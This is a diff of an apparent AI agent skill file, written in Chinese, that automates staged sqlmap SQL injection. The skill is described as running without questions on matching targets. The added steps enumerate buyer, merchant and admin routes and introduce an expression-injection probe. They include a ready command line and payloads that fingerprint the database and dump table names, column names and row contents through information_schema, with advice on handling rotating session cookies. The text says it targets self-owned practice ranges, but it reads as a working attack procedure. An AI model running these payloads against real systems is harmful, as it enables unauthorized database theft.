@@ -1,7 +1,7 @@
 ---
 name: sqlmap-skill
 description: sqlmap 分阶段自动化注入工作流（WorkBuddy skill）。命中靶场档案即零问答直通：自动登录取 Cookie → 基线核验 → 分阶段检测/枚举/取数/哈希/单发命令/读写文件 → 里程碑汇报，每步证据落盘。触发场景：用 sqlmap 打 SQL 注入、注入测试、注入点检测、布尔盲注、UNION 盲注、拖库/取表/取列/取数据、dump 数据库、DVWA/北岸商城等自有靶场演练。中英触发词：sqlmap、SQL注入、SQL 注入、注入测试、注入点、拖库、盲注、UNION 注入、dump 数据库、sqli、SQL injection、dump database、injection point。
-version: 2.6.0
+version: 2.7.0
 display_name: sqlmap 分阶段注入工作流
 argument-hint: <目标 URL 或档案名，如 dvwa / northbank / http://...>
 ---
@@ -27,6 +27,18 @@ argument-hint: <目标 URL 或档案名，如 dvwa / northbank / http://...>
   1. 注入点在哪？（URL + 参数位置；请把 `*` 放在精确注入点，如 `?keyword=1*&from=`。默认：用户给的 URL 里最像参数的那个）
   2. 要不要会话？（默认：不要；POST/JSON 或需登录的目标要 Cookie）
   3. 这次打到哪一步？（默认：detect 判定；想继续随时加 stage）
+
+### Step 0.5 · 先数工作台（买家 / 商家 / 平台）
+
+同一个站常有多个入口，**买家侧干净不代表整站干净**。先花 3 个请求分清：
+
+| 响应 | 含义 |
+|---|---|
+| `302 → /login` | 路由存在，但未登录 |
+| `403` | 路由存在，已登录但角色不对（换商家/管理员账号） |
+| `404` | 路由不存在 |
+
+常用路径：`/buyer`、`/merchant`、`/admin`、`/supplier`、`/seller`。本机实测 NEXA：买家 `/buyer` 全部参数化，真正的 SQLi 在商家 `/merchant/reports/export` 的 `dimension` 参数——如果不是先发现 `/merchant`，买家侧再测一天也找不到。拿到账号后先登录目标工作台，再开始枚举参数。
 
 ### Step 1 · 组装 job
 
@@ -143,7 +155,32 @@ python scripts/inject_probe.py --target "http://host/cart/update" --method POST 
 - 产物：`inject-evidence.json`（每发请求的 URL/载荷/状态/签名）+ `inject-raw/`（原始响应全文）——直接当报告里的证据
 - **改完工具先自检**：`python scripts/selftest.py`（自建靶点跑可注入/过滤/限速/403 四态，期望全 PASS）
 
+### Step 4.6 · 列名 / 表达式注入（expr_probe.py，报表导出）
 
+报表、导出、统计接口常把参数当**列名或表达式**直接拼进 SQL，例如
+`/merchant/reports/export?from=...&to=...&dimension=category`。
+这类位点用引号和布尔探测会**全部 500**，很容易被误判成“不可注入”。
+
+判据（4 发请求）：
+1. 基线 `dimension=category` → 200/CSV；
+2. `dimension=(SELECT '随机标记')` → 标记出现在导出内容里；
+3. `dimension=(SELECT 1)` → 第一列变成 `1`；
+4. 自定义表达式取数。
+
+```
+python scripts/expr_probe.py \
+  --target "https://host/merchant/reports/export?from=2026-07-26&to=2026-10-23&dimension=*" \
+  --base category --cookie-jar cookies.txt \
+  --expr "(SELECT version())" --expr "(SELECT database())"
+```
+
+- **会话会轮换 Cookie**：优先用 `--cookie-jar`（脚本自己读 Netscape jar 并在内存里跟随 Set-Cookie）；静态 `--cookie` 在长跑里会掉成登录页。基线返回登录页时脚本会直接判 `login_required`，不把 CSRF 变化当注入。
+- 命中后先指纹：`(SELECT version())`、`(SELECT database())`、`(SELECT user())`；MariaDB/MySQL 用 `information_schema`，SQLite 用 `sqlite_master`（NEXA 是 MariaDB 10.11，`sqlite_master` 会 500）。
+- 取数模板：
+  `(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())`
+  `(SELECT group_concat(concat(table_name,':',column_name)) FROM information_schema.columns WHERE table_schema=database())`
+  `(SELECT group_concat(concat(k,'=',v)) FROM 目标表)`
+- 输出是 CSV 的第一列（维度），`GROUP BY` 会把常量表达式聚成一行；先看表头，别被“聚合行”迷惑。
 
 每个 stage 跑完，按运行器输出的格式汇报（不要改写成模糊叙述）：
 
@@ -219,6 +256,9 @@ detect 的 milestone 读完后，按 EVIDENCE 选下一步，**每一步都报�
 | 500 连发 + dump 空 | 输入长度上限/错误被吞 | 换短载荷；问用户应用上限 |
 | UNION 假阴性 | 列数或回显位没对上 | `--union-cols N`、换 `union-char`、布尔用 `--string` |
 | 时延注入不稳 | 链路慢/共享 | 调 `time_sec`（3–10），或换技术 |
+| 跑一半突然 302 → /login | 会话轮换/过期（常有 Cookie 轮换） | 改用 cookie jar 重登，别复用静态 Cookie；见 Step 4.6 |
+| 导出页 `dimension=xxx'` 500，`(SELECT 1)` 却返回 1 | 列名/表达式注入 | 用 `expr_probe.py`，读 `information_schema`，CSV 第一列就是回显 |
+| 整站 530（Cloudflare Tunnel error） | 隧道 origin 掉了，不是 WAF | 等 origin 恢复；quick tunnel 重启后域名会变，重新取地址并跑 `/health` |
 
 ## References
 
